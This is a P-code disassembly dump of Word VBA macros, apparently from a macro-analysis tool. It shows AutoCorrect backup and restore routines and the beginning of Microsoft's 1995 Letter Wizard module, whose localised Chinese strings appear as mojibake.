\tLd Selection \n' \tMemLd Then \n' \tSt szRTF \n' Line #140:\n' \tLd szRTF \n' \tLitStr 0x0005 \"False\"\n' \tEq \n' \tIfBlock \n' Line #141:\n' \tLd StatMsg1 \n' \tLd szName \n' \tConcat \n' \tLd Application \n' \tMemSt StatusBar \n' Line #142:\n' \tLd szName \n' \tParamNamed New \n' \tLd szValue \n' \tParamNamed Value \n' \tLd oACorrect \n' \tArgsMemCall Add 0x0002 \n' Line #143:\n' \tElseBlock \n' Line #144:\n' \tLd StatMsg1 \n' \tLd szName \n' \tConcat \n' \tLd Application \n' \tMemSt StatusBar \n' Line #145:\n' \tLd wdCell \n' \tParamNamed unit \n' \tLd Selection \n' \tArgsMemCall MoveLeft 0x0001 \n' Line #146:\n' \tLd szName \n' \tLd Selection \n' \tMemLd Range \n' \tLd oACorrect \n' \tArgsMemCall AddRichText 0x0002 \n' Line #147:\n' \tLd wdCell \n' \tParamNamed unit \n' \tLd Selection \n' \tArgsMemCall MoveRight 0x0001 \n' Line #148:\n' \tEndIfBlock \n' Line #149:\n' \tLd wdCell \n' \tParamNamed unit \n' \tLd Selection \n' \tArgsMemCall MoveRight 0x0001 \n' Line #150:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #151:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #152:\n' \tLd szRestoreCompletemsg \n' \tArgsCall MsgBox 0x0001 \n' Line #153:\n' \tElseBlock \n' Line #154:\n' \tLd szFormatIncorrect \n' \tArgsCall MsgBox 0x0001 \n' Line #155:\n' \tEndIfBlock \n' Line #156:\n' Line #157:\n' Line #158:\n' \tLabel RestoreACEntriesErrors \n' Line #159:\n' \tLd Err \n' \tMemLd Number \n' \tSelectCase \n' Line #160:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' Line #161:\n' \tQuoteRem 0x0004 0x0009 \" no error\"\n' Line #162:\n' \tCaseElse \n' Line #163:\n' \tLd szACEntriesErrorMsg \n' \tLd vbCr \n' \tConcat \n' \tLd Err \n' \tMemLd Number \n' \tConcat \n' \tLitStr 0x0002 \"  \"\n' \tConcat \n' \tLd Err \n' \tMemLd Description \n' \tConcat \n' \tLitStr 0x0001 \" \"\n' \tConcat \n' \tLd szName \n' \tConcat \n' \tParen \n' \tArgsCall MsgBox 0x0001 \n' Line #164:\n' \tEndSelect \n' Line #165:\n' Line #166:\n' Line #167:\n' \tEndFunc \n' Line #168:\n' Line #169:\n' \tQuoteRem 0x0000 0x0025 \"****** GetAutoCorrectEntries() ******\"\n' Line #170:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #171:\n' \tQuoteRem 0x0000 0x0054 \" Inserts each AutoCorrect entry into a Word document including the Value and whether\"\n' Line #172:\n' \tQuoteRem 0x0000 0x004C \" or not it is to include formatting.  Name is the current name of the entry,\"\n' Line #173:\n' \tQuoteRem 0x0000 0x0055 \" Value is the text value of the entry, and RTF is a Boolean that is True if the entry\"\n' Line #174:\n' \tQuoteRem 0x0000 0x0068 \" has \"formatted text\" checked.  Then converts the text into a table and adds a heading row to the table.\"\n' Line #175:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #176:\n' \tQuoteRem 0x0000 0x0033 \" x is used to loop through the AutoCorrect entries.\"\n' Line #177:\n' \tQuoteRem 0x0000 0x002C \" TotalACEntries is the number of AC entries.\"\n' Line #178:\n' Line #179:\n' \tFuncDefn (Private Function GetAutoCorrectEntries(id_FFFE As Variant))\n' Line #180:\n' \tDim \n' \tVarDefn x (As Integer)\n' Line #181:\n' \tDim \n' \tVarDefn TotalACEntries (As Integer)\n' Line #182:\n' Line #183:\n' \tLd Application \n' \tMemLd Autocorrect \n' \tMemLd Entries \n' \tMemLd Count \n' \tSt TotalACEntries \n' Line #184:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd TotalACEntries \n' \tFor \n' Line #185:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #186:\n' \tLd x \n' \tLd Application \n' \tMemLd Autocorrect \n' \tMemLd Entries \n' \tArgsMemLd item 0x0001 \n' \tMemLd New \n' \tParamNamed Then \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #187:\n' \tLd vbTab \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #188:\n' Line #189:\n' \tQuoteRem 0x000A 0x0035 \"check for formatting and insert RTF text if necessary\"\n' Line #190:\n' \tLd x \n' \tLd Application \n' \tMemLd Autocorrect \n' \tMemLd Entries \n' \tArgsMemLd item 0x0001 \n' \tMemLd RichText \n' \tLitVarSpecial (True)\n' \tEq \n' \tIfBlock \n' Line #191:\n' \tLd Selection \n' \tMemLd Range \n' \tParamNamed Range \n' \tLd x \n' \tLd Application \n' \tMemLd Autocorrect \n' \tArgsMemLd Entries 0x0001 \n' \tArgsMemCall Apply 0x0001 \n' Line #192:\n' \tElseBlock \n' Line #193:\n' \tLd x \n' \tLd Application \n' \tMemLd Autocorrect \n' \tMemLd Entries \n' \tArgsMemLd item 0x0001 \n' \tMemLd Value \n' \tParamNamed Then \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #194:\n' \tEndIfBlock \n' Line #195:\n' Line #196:\n' \tLd vbTab \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #197:\n' \tLd x \n' \tLd Application \n' \tMemLd Autocorrect \n' \tMemLd Entries \n' \tArgsMemLd item 0x0001 \n' \tMemLd RichText \n' \tParamNamed Then \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #198:\n' \tArgsMemCallWith TypeParagraph 0x0000 \n' Line #199:\n' \tEndWith \n' Line #200:\n' Line #201:\n' \tQuoteRem 0x0004 0x0011 \"update status bar\"\n' Line #202:\n' \tQuoteRem 0x0000 0x0043 \"   Application.StatusBar = StatMsg1 & X & StatMsg2 & TotalACEntries\"\n' Line #203:\n' \tLd StatMsg1 \n' \tLd TotalACEntries \n' \tConcat \n' \tLd StatMsg2 \n' \tConcat \n' \tLd x \n' \tConcat \n' \tLd Application \n' \tMemSt StatusBar \n' Line #204:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #205:\n' Line #206:\n' Line #207:\n' \tQuoteRem 0x0000 0x0011 \" convert to table\"\n' Line #208:\n' \tLd StatMsg3 \n' \tLd Application \n' \tMemSt StatusBar \n' Line #209:\n' \tLd wdStory \n' \tParamNamed unit \n' \tLd wdExtend \n' \tParamNamed Extend \n' \tLd Selection \n' \tArgsMemCall HomeKey 0x0002 \n' Line #210:\n' Line #211:\n' \tLineCont 0x000C 0B 00 02 00 1B 00 02 00 2B 00 02 00\n' \tLd wdSeparateByTabs \n' \tParamNamed Separator \n' \tLd wdTableFormatSimple1 \n' \tParamNamed Format$ \n' \tLitVarSpecial (False)\n' \tParamNamed ApplyBorders \n' \tLitVarSpecial (False)\n' \tParamNamed ApplyShading \n' \tLitVarSpecial (False)\n' \tParamNamed ApplyFont \n' \tLitVarSpecial (False)\n' \tParamNamed ApplyColor \n' \tLitVarSpecial (False)\n' \tParamNamed ApplyHeadingRows \n' \tLitVarSpecial (False)\n' \tParamNamed ApplyLastRow \n' \tLitVarSpecial (False)\n' \tParamNamed ApplyFirstColumn \n' \tLitVarSpecial (False)\n' \tParamNamed ApplyLastColumn \n' \tLitVarSpecial (True)\n' \tParamNamed AutoFit \n' \tLd Selection \n' \tArgsMemCall ConvertToTable 0x000B \n' Line #212:\n' Line #213:\n' \tQuoteRem 0x0000 0x0010 \" add row heading\"\n' Line #214:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #215:\n' \tLd wdLine \n' \tParamNamed unit \n' \tLitDI2 0x0001 \n' \tParamNamed Count \n' \tArgsMemCallWith MoveUp 0x0002 \n' Line #216:\n' \tLitDI2 0x0001 \n' \tArgsMemCallWith InsertRows 0x0001 \n' Line #217:\n' \tLitStr 0x0004 \"Name\"\n' \tParamNamed Then \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #218:\n' \tLd wdCell \n' \tParamNamed unit \n' \tArgsMemCallWith MoveRight 0x0001 \n' Line #219:\n' \tLitStr 0x0005 \"Value\"\n' \tParamNamed Then \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #220:\n' \tLd wdCell \n' \tParamNamed unit \n' \tArgsMemCallWith MoveRight 0x0001 \n' Line #221:\n' \tLitStr 0x0003 \"RTF\"\n' \tParamNamed Then \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #222:\n' \tLd wdStory \n' \tParamNamed unit \n' \tArgsMemCallWith HomeKey 0x0001 \n' Line #223:\n' \tEndWith \n' Line #224:\n' Line #225:\n' \tQuoteRem 0x0001 0x0032 \"Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext\"\n' Line #226:\n' \tQuoteRem 0x0001 0x0027 \"Selection.InsertBreak Type:=wdPageBreak\"\n' Line #227:\n' Line #228:\n' \tEndFunc \n' Line #229:\n' Line #230:\n' \tFuncDefn (Public Function SaveACDoc(id_FFFE As Variant))\n' Line #231:\n' \tDim \n' \tVarDefn Style\n' \tVarDefn Response (As Integer)\n' Line #232:\n' \tDim \n' \tVarDefn Title (As String)\n' Line #233:\n' Line #234:\n' \tLitVarSpecial (True)\n' \tSt SaveACDoc \n' Line #235:\n' \tLd Err \n' \tArgsMemCall Clear 0x0000 \n' Line #236:\n' \tOnError SaveACDocErrors \n' Line #237:\n' Line #238:\n' \tLd ActiveDocument \n' \tArgsMemCall Save 0x0000 \n' Line #239:\n' Line #240:\n' \tLabel SaveACDocErrors \n' Line #241:\n' \tLd Err \n' \tMemLd Number \n' \tSelectCase \n' Line #242:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' Line #243:\n' \tQuoteRem 0x0004 0x0009 \" no error\"\n' Line #244:\n' \tLitDI2 0x1066 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' Line #245:\n' \tQuoteRem 0x0004 0x0007 \" cancel\"\n' Line #246:\n' \tLitVarSpecial (False)\n' \tSt SaveACDoc \n' Line #247:\n' \tCaseElse \n' Line #248:\n' \tLd vbYesNo \n' \tLd vbCritical \n' \tAdd \n' \tLd vbDefaultButton2 \n' \tAdd \n' \tSt Style \n' \tQuoteRem 0x0036 0x0010 \" Define buttons.\"\n' Line #249:\n' Line #250:\n' \tQuoteRem 0x0006 0x003D \" put error number and description in title of the message box\"\n' Line #251:\n' \tLd Err \n' \tMemLd Number \n' \tLitStr 0x0002 \"  \"\n' \tConcat \n' \tLd Err \n' \tMemLd Description \n' \tConcat \n' \tSt Title \n' Line #252:\n' Line #253:\n' \tLd szErrorMsg \n' \tLd Style \n' \tLd Title \n' \tArgsLd MsgBox 0x0003 \n' \tSt Response \n' Line #254:\n' \tLd Response \n' \tLd vbYes \n' \tEq \n' \tIfBlock \n' Line #255:\n' \tResume  \n' \tQuoteRem 0x0011 0x0015 \"bring up SaveAs again\"\n' Line #256:\n' \tElseBlock \n' \tQuoteRem 0x000E 0x0010 \" User choose No.\"\n' Line #257:\n' \tLitVarSpecial (False)\n' \tSt SaveACDoc \n' Line #258:\n' \tEndIfBlock \n' Line #259:\n' \tEndSelect \n' Line #260:\n' Line #261:\n' \tEndFunc \n' Line #262:\n' Line #263:\n' Line #264:\n' \tFuncDefn (Public Function OpenACDoc(ByVal ACFileOpenName As String, id_FFFE As Boolean) As Boolean)\n' Line #265:\n' Line #266:\n' \tDim \n' \tVarDefn Style (As Integer)\n' Line #267:\n' Line #268:\n' \tLitVarSpecial (True)\n' \tSt OpenACDoc \n' Line #269:\n' \tLd Err \n' \tArgsMemCall Clear 0x0000 \n' Line #270:\n' \tOnError OpenACDocErrors \n' Line #271:\n' Line #272:\n' \tLd ACFileOpenName \n' \tParamNamed FileName \n' \tLd Documents \n' \tArgsMemCall Option 0x0001 \n' Line #273:\n' Line #274:\n' \tLabel OpenACDocErrors \n' Line #275:\n' \tLd Err \n' \tMemLd Number \n' \tLitDI2 0x0000 \n' \tNe \n' \tIfBlock \n' Line #276:\n' \tLitVarSpecial (False)\n' \tSt OpenACDoc \n' Line #277:\n' \tEndIfBlock \n' Line #278:\n' Line #279:\n' \tEndFunc \n' Line #280:\n' Macros/VBA/UM01 - 94328 bytes\n' Line #0:\n' Line #1:\n' \tQuoteRem 0x0000 0x0032 \"**************************************************\"\n' Line #2:\n' \tQuoteRem 0x0000 0x000E \" Letter Wizard\"\n' Line #3:\n' \tQuoteRem 0x0000 0x0012 \" StartWizard Macro\"\n' Line #4:\n' \tQuoteRem 0x0000 0x002A \" %% Copyright c 1995 Microsoft Corporation\"\n' Line #5:\n' \tQuoteRem 0x0000 0x0032 \"**************************************************\"\n' Line #6:\n' Line #7:\n' \tQuoteRem 0x0000 0x001D \"%% Universal DLL declarations\"\n' Line #8:\n' \tQuoteRem 0x0000 0x0063 \"Declare Function FindWindow Lib \"user.exe\"(lpClassName$, lpWinName$) As 'Integer Alias \"FindWindow\"\"\n' Line #9:\n' \tQuoteRem 0x0000 0x0086 \"Declare Function WinHelp Lib \"user.exe\"(hWnd As Integer, lpHelpFile$, 'wCommand As Integer, dwData As Long) As Integer Alias \"WinHelp\"\"\n' Line #10:\n' \tFuncDefn (Private Declare Function FindWindow Lib \"user32.dll\" (ByVal lpClassName, ByVal lpWinName) As Long)\n' Line #11:\n' \tFuncDefn (Private Declare Function WinHelp Lib \"user32.dll\" (ByVal hwnd As Long, ByVal lpHelpFile, ByVal wCommand As Long, ByVal dwData As Long) As Long)\n' Line #12:\n' Line #13:\n' \tQuoteRem 0x0000 0x0020 \"%% Universal shared variables %%\"\n' Line #14:\n' \tDim (Public) \n' \tVarDefn State\n' \tVarDefn LastState\n' Line #15:\n' \tDim (Public) \n' \tVarDefn StateItems__\n' Line #16:\n' \tDim (Public) \n' \tVarDefn dlg (As Object)\n' Line #17:\n' \tDim (Public) \n' \tVarDefn HideFilePreview__\n' Line #18:\n' \tDim (Public) \n' \tVarDefn wizname\n' Line #19:\n' \tDim (Public) \n' \tVarDefn iWorkDoc\n' \tVarDefn iEmptyDoc\n' \tVarDefn workDoc\n' \tVarDefn emptyDoc\n' Line #20:\n' \tDim (Public) \n' \tVarDefn HelpCtx\n' Line #21:\n' \tDim (Public) \n' \tVarDefn gDoogie\n' Line #22:\n' Line #23:\n' \tQuoteRem 0x0000 0x0026 \"%% Wizard-specific shared variables %%\"\n' Line #24:\n' \tDim (Public) \n' \tVarDefn LettersPath\n' \tQuoteRem 0x001B 0x0032 \"Path to prewritten business letters (LETTERS-PATH)\"\n' Line #25:\n' \tDim (Public) \n' \tVarDefn LetterMax\n' \tQuoteRem 0x0013 0x0011 \"Number of letters\"\n' Line #26:\n' \tDim (Public) \n' \tVarDefn LetterNames__\n' \tQuoteRem 0x0018 0x0010 \"Names of letters\"\n' Line #27:\n' \tDim (Public) \n' \tVarDefn LetterFiles__\n' \tQuoteRem 0x001B 0x0014 \"Filenames of letters\"\n' Line #28:\n' \tDim (Public) \n' \tVarDefn defLttr\n' \tQuoteRem 0x0013 0x001B \"Default category and letter\"\n' Line #29:\n' \tDim (Public) \n' \tVarDefn RetAddressLines\n' \tQuoteRem 0x0017 0x0006 \"DAPFEL\"\n' Line #30:\n' \tDim (Public) \n' \tVarDefn gEnvelopeLabel\n' Line #31:\n' \tDim (Public) \n' \tVarDefn dlgEL (As Object)\n' Line #32:\n' \tDim (Public) \n' \tVarDefn toui (As Object)\n' Line #33:\n' \tDim (Public) \n' \tVarDefn gPrewrittenFile\n' Line #34:\n' \tDim (Public) \n' \tVarDefn gCurrentHeadingPosition\n' \tVarDefn rtDistToLftDist\n' Line #35:\n' \tDim (Public) \n' \tVarDefn RetAddress__\n' \tQuoteRem 0x0017 0x001C \"Return Address Array (max 5)\"\n' Line #36:\n' \tQuoteRem 0x0000 0x0011 \"%% Strings galore\"\n' Line #37:\n' \tDim (Public) \n' \tVarDefn kThing\n' \tVarDefn kUpThing\n' \tVarDefn kWizname\n' \tVarDefn Wizard_\n' \tVarDefn Normal_\n' \tVarDefn kGallery\n' Line #38:\n' \tDim (Public) \n' \tVarDefn kErrBadDoc\n' \tVarDefn kTip\n' \tVarDefn kLetterPath\n' \tVarDefn kLettersDir\n' \tVarDefn kLongLettersDir\n' Line #39:\n' \tDim (Public) \n' \tVarDefn kSetupDialog\n' \tVarDefn kCreatingDoc\n' \tVarDefn kSaveSettings\n' \tVarDefn kRstSettings\n' Line #40:\n' \tDim (Public) \n' \tVarDefn kRstStylsheet\n' \tVarDefn kLookingForLetters\n' \tVarDefn kLoadingLetterDetails\n' \tVarDefn kLookingFor\n' \tVarDefn kEnterRecipientAddress\n' Line #41:\n' \tDim (Public) \n' \tVarDefn chQuote\n' \tVarDefn kAddressATEntry\n' Line #42:\n' \tDim (Public) \n' \tVarDefn Dot_\n' \tVarDefn Letter_\n' \tVarDefn kRE\n' \tVarDefn kAccountID\n' \tVarDefn kDear\n' \tVarDefn kRecipient\n' \tVarDefn kTypeHere\n' \tVarDefn TPath\n' \tVarDefn kName\n' Line #43:\n' \tDim (Public) \n' \tVarDefn kClosePersonal\n' \tVarDefn kCloseBusiness\n' \tVarDefn kWritersInitials\n' \tVarDefn kTypistsInitials\n' Line #44:\n' \tDim (Public) \n' \tVarDefn kCC\n' \tVarDefn kNames\n' \tVarDefn kEnclosures\n' \tVarDefn kNumber\n' \tVarDefn kAttachments\n' \tVarDefn kFormalDateFormat\n' \tVarDefn kPage\n' \tVarDefn kEmptyMacro\n' \tVarDefn kInsertAddress\n' \tVarDefn kMacroButton\n' Line #45:\n' \tDim (Public) \n' \tVarDefn kErrLetterNotFound\n' \tVarDefn kErrThatLetterNotFound\n' Line #46:\n' \tDim (Public) \n' \tVarDefn kErrStyleNotFound1\n' \tVarDefn kErrStyleNotFound2\n' \tVarDefn kErrCannotCreate1\n' \tVarDefn kErrCannotCreate2\n' Line #47:\n' \tDim (Public) \n' \tVarDefn kTypeCompanyName\n' Line #48:\n' \tDim (Public) \n' \tVarDefn kFntArial\n' \tVarDefn kFntWndngs\n' \tVarDefn kDfltPageNum\n' Line #49:\n' \tDim (Public) \n' \tVarDefn pt90_\n' \tVarDefn pt72_\n' \tVarDefn pt216_\n' \tVarDefn kFtrDist1\n' \tVarDefn kFtrDist2\n' Line #50:\n' \tDim (Public) \n' \tVarDefn kErrMaxLines\n' Line #51:\n' \tDim (Public) \n' \tVarDefn cntmplet\n' \tVarDefn proflett\n' \tVarDefn eleglett\n' Line #52:\n' \tDim (Public) \n' \tVarDefn kStyCmpnyName\n' \tVarDefn kStyBodyText\n' \tVarDefn kStyRetAddr\n' \tVarDefn kStyCC\n' \tVarDefn kStyEncl\n' \tVarDefn kStySigName\n' \tVarDefn kStySal\n' \tVarDefn kStySubjLine\n' \tVarDefn kStyDate\n' \tVarDefn kStyInsideAddr\n' \tVarDefn kStyRefIntls\n' Line #53:\n' \tDim (Public Const) \n' \tLitStr 0x002D \"Word \u00a6b\u00a8\u00cf\u00a5\u00ce\u00aa\u00cc\u00bdd\u00a5\u00bb\u00aa\u00ba\u00b3]\u00a9w\u00b8\u00f4\u00ae|\u00b8\u00cc\u00a1A\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00a5\u00bb\u00ba\u00eb\u00c6F\u00a1C\"\n' \tVarDefn strERR_WIZ_NOT_FOUND (As String) 0x0024\n' Line #54:\n' \tDim (Public Const) \n' \tLitStr 0x0007 \"Cletter\"\n' \tVarDefn strWizShortName\n' Line #55:\n' Line #56:\n' \tRem 0x0000 \"\"\n' Line #57:\n' \tRem 0x001E \" ======== InitStrings ========\"\n' Line #58:\n' \tRem 0x0028 \" Please read LocNotes before localizing!\"\n' Line #59:\n' \tRem 0x0000 \"\"\n' Line #60:\n' \tFuncDefn (Private Sub InitStrings())\n' Line #61:\n' \tDim \n' \tVarDefn kRstStylesheet\n' Line #62:\n' Line #63:\n' \tRem 0x002A \" Name of wizard & document/object produced\"\n' Line #64:\n' \tLitStr 0x0008 \"\u00ad^\u00a4\u00e5\u00abH\u00a5\u00f3\"\n' \tSt kThing$ \n' Line #65:\n' \tLitStr 0x0008 \"\u00ad^\u00a4\u00e5\u00abH\u00a5\u00f3\"\n' \tSt kUpThing$ \n' Line #66:\n' \tLitStr 0x000C \"\u00ad^\u00a4\u00e5\u00abH\u00a5\u00f3\u00ba\u00eb\u00c6F\"\n' \tSt kWizname$ \n' Line #67:\n' \tLitStr 0x0004 \"\u00b1\u00d2\u00b0\u00ca\"\n' \tLd kWizname$ \n' \tAdd \n' \tLitStr 0x0003 \"...\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #68:\n' \tLd kWizname$ \n' \tSt Wizard_$ \n' \tQuoteRem 0x0019 0x003D \"Should be name as it appears in FileNew (change if different)\"\n' Line #69:\n' \tLitStr 0x0006 \"normal\"\n' \tSt Normal_$ \n' \tQuoteRem 0x0018 0x000F \"normal template\"\n' Line #70:\n' \tLitStr 0x0007 \"  Page \"\n' \tSt kPage$ \n' Line #71:\n' \tLitStr 0x000E \"\u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00a9m\u00a6W\"\n' \tSt kName$ \n' Line #72:\n' \tLitStr 0x000B \"EmptyMacro \"\n' \tSt kEmptyMacro$ \n' Line #73:\n' \tLitStr 0x000F \"Gallery Example\"\n' \tSt kGallery$ \n' Line #74:\n' \tLitStr 0x000D \"InsertAddress\"\n' \tSt kInsertAddress$ \n' \tQuoteRem 0x0026 0x0020 \"Used to check if MAPI is present\"\n' Line #75:\n' \tLitStr 0x000C \"MACROBUTTON \"\n' \tSt kMacroButton$ \n' Line #76:\n' \tRem 0x0070 \" Default address stored as AT Entry. used to check if user has entered an address in prewritten business letters\"\n' Line #77:\n' \tLitStr 0x000C \"Company Name\"\n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitStr 0x000E \"Street Address\"\n' \tAdd \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitStr 0x0020 \"City, State/Province  Zip/Postal\"\n' \tAdd \n' \tSt kAddressATEntry$ \n' Line #78:\n' \tLitStr 0x0017 \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00a6\u00ac\u00a5\u00f3\u00a4H\u00a6a\u00a7} \"\n' \tSt kEnterRecipientAddress$ \n' Line #79:\n' \tRem 0x0006 \" Fonts\"\n' Line #80:\n' \tLitStr 0x0005 \"Arial\"\n' \tSt kFntArial$ \n' Line #81:\n' \tLitStr 0x0009 \"Wingdings\"\n' \tSt kFntWndngs$ \n' Line #82:\n' \tLitStr 0x0001 \"l\"\n' \tSt kDfltPageNum$ \n' Line #83:\n' \tRem 0x000D \" Misc strings\"\n' Line #84:\n' \tLitStr 0x0044 \"\u00ba\u00eb\u00c6F\u00b5L\u00aak\u00a8\u00cf\u00a5\u00ce\u00b2{\u00a6\u00e6\u00a4\u00e5\u00a5\u00f3\u00a1C\u00adY\u00adn\u00b0\u00f5\u00a6\u00e6\u00ba\u00eb\u00c6F\u00a1A\u00bd\u00d0\u00bf\u00ef\u00a1u\u00c0\u00c9\u00ae\u00d7\u00a1v\u00a1u\u00b6}\u00b7s\u00c0\u00c9\u00ae\u00d7\u00a1v\u00a1A\u00a6A\u00bf\u00ef\u00a8\u00fa\"\n' \tLd Wizard_$ \n' \tAdd \n' \tLitStr 0x0002 \"\u00a1C\"\n' \tAdd \n' \tSt kErrBadDoc$ \n' Line #85:\n' \tLitStr 0x0005 \"\u00b4\u00a3\u00a5\u00dc:\"\n' \tSt kTip$ \n' Line #86:\n' \tLitStr 0x000C \"letters-path\"\n' \tSt kLetterPath$ \n' \tQuoteRem 0x0022 0x001A \"optional .ini file setting\"\n' Line #87:\n' \tRem 0x000F \" Banter strings\"\n' Line #88:\n' \tLitStr 0x0013 \"\u00a5\u00bf\u00a6b\u00b3]\u00a9w\u00b9\u00ef\u00b8\u00dc\u00a4\u00e8\u00b6\u00f4...\"\n' \tSt kSetupDialog$ \n' Line #89:\n' \tLitStr 0x000F \"\u00a5\u00bf\u00a6b\u00ab\u00d8\u00a5\u00df\u00a4\u00e5\u00a5\u00f3...\"\n' \tSt kCreatingDoc$ \n' Line #90:\n' \tLitStr 0x000F \"\u00a5\u00bf\u00a6b\u00c0x\u00a6s\u00b3]\u00a9w...\"\n' \tSt kSaveSettings$ \n' Line #91:\n' \tLitStr 0x000F \"\u00a5\u00bf\u00a6b\u00c1\u00d9\u00ad\u00ec\u00b3]\u00a9w...\"\n' \tSt kRstSettings$ \n' Line #92:\n' \tLitStr 0x000F \"\u00a5\u00bf\u00a6b\u00c1\u00d9\u00ad\u00ec\u00bc\u00cb\u00a6\u00a1...\"\n' \tSt kRstStylesheet$ \n' Line #93:\n' \tLitStr 0x000F \"\u00a5\u00bf\u00a6b\u00b4M\u00a7\u00e4\u00abH\u00a5\u00f3...\"\n' \tSt kLookingForLetters$ \n' Line #94:\n' \tLitStr 0x0013 \"\u00a5\u00bf\u00a6b\u00b8\u00fc\u00a4J\u00abH\u00a5\u00f3\u00b2\u00d3\u00b8`...\"\n' \tSt kLoadingLetterDetails$ \n' Line #95:\n' \tLitStr 0x0004 \"\u00b4M\u00a7\u00e4\"\n' \tSt kLookingFor$ \n' \tQuoteRem 0x001A 0x0023 \"--> 'Looking for \"somefile.dot\"...'\"\n' Line #96:\n' \tLitDI2 0x0022 \n' \tArgsLd Chr 0x0001 \n' \tSt chQuote$ \n' \tQuoteRem 0x0018 0x0002 \" \"\"\n' Line #97:\n' \tRem 0x000E \" Style strings\"\n' Line #98:\n' \tLitStr 0x000C \"Company Name\"\n' \tSt kStyCmpnyName$ \n' Line #99:\n' \tLitStr 0x000E \"Body Text Keep\"\n' \tSt kStyBodyText$ \n' Line #100:\n' \tLitStr 0x000E \"Return Address\"\n' \tSt kStyRetAddr$ \n' Line #101:\n' \tLitStr 0x000E \"Inside Address\"\n' \tSt kStyInsideAddr$ \n' Line #102:\n' \tLitStr 0x0002 \"CC\"\n' \tSt kStyCC$ \n' Line #103:\n' \tLitStr 0x0009 \"Enclosure\"\n' \tSt kStyEncl$ \n' Line #104:\n' \tLitStr 0x000E \"Signature Name\"\n' \tSt kStySigName$ \n' Line #105:\n' \tLitStr 0x000A \"Salutation\"\n' \tSt kStySal$ \n' Line #106:\n' \tLitStr 0x000C \"Subject Line\"\n' \tSt kStySubjLine$ \n' Line #107:\n' \tLitStr 0x0004 \"Date\"\n' \tSt kStyDate$ \n' Line #108:\n' \tLitStr 0x0012 \"Reference Initials\"\n' \tSt kStyRefIntls$ \n' Line #109:\n' \tRem 0x002C \" == Other strings specific to this wizard ==\"\n' Line #110:\n' \tLitStr 0x0006 \"letter\"\n' \tSt Letter_$ \n' \tQuoteRem 0x0019 0x002F \"Prefix for wizard stylesheets (eg, Letter1.dot)\"\n' Line #111:\n' \tLitStr 0x0004 \".dot\"\n' \tSt Dot_$ \n' Line #112:\n' \tLitStr 0x0009 \"Subject: \"\n' \tSt kRE$ \n' Line #113:\n' \tLitStr 0x0017 \"\u00b9q\u00a4l\u00b6l\u00a5\u00f3\u00b1b\u00b8\u00b9/\u00a4\u00e5\u00a5\u00f3\u00c3\u00d1\u00a7O\u00bdX\"\n' \tSt kAccountID$ \n' Line #114:\n' \tLitStr 0x0005 \"Dear \"\n' \tSt kDear$ \n' Line #115:\n' \tLitStr 0x0012 \"\u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00abH\u00a5\u00f3\u00a4\u00ba\u00aee\"\n' \tSt kTypeHere$ \n' Line #116:\n' \tLitStr 0x0018 \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a9m\u00a6W  \"\n' \tSt kRecipient$ \n' Line #117:\n' \tLitStr 0x000C \"Yours truly,\"\n' \tSt kClosePersonal$ \n' Line #118:\n' \tLitStr 0x000A \"Sincerely,\"\n' \tSt kCloseBusiness$ \n' Line #119:\n' \tLitStr 0x001C \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00b1H\u00a5\u00f3\u00aa\u00cc\u00a9m\u00a6W\u00c1Y\u00bcg  \"\n' \tSt kWritersInitials$ \n' Line #120:\n' \tLitStr 0x001C \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00bds\u00c2\u00b5\u00aa\u00cc\u00a9m\u00a6W\u00c1Y\u00bcg  \"\n' \tSt kTypistsInitials$ \n' Line #121:\n' \tLitStr 0x0004 \"Cc: \"\n' \tSt kCC$ \n' Line #122:\n' \tLitStr 0x0012 \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00a9m\u00a6W  \"\n' \tSt kNames$ \n' Line #123:\n' \tLitStr 0x000C \"Enclosures: \"\n' \tSt kEnclosures$ \n' Line #124:\n' \tLitStr 0x0012 \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00b8\u00b9\u00bdX  \"\n' \tSt kNumber$ \n' Line #125:\n' \tLitStr 0x000B \"Attachments\"\n' \tSt kAttachments$ \n' Line #126:\n' \tLitStr 0x000C \"MMMM d, yyyy\"\n' \tSt kFormalDateFormat$ \n' Line #127:\n' \tRem 0x000D \" Measurements\"\n' Line #128:\n' \tLitStr 0x0004 \"90pt\"\n' \tSt pt90_$ \n' Line #129:\n' \tLitStr 0x0004 \"72pt\"\n' \tSt pt72_$ \n' Line #130:\n' \tLitStr 0x0005 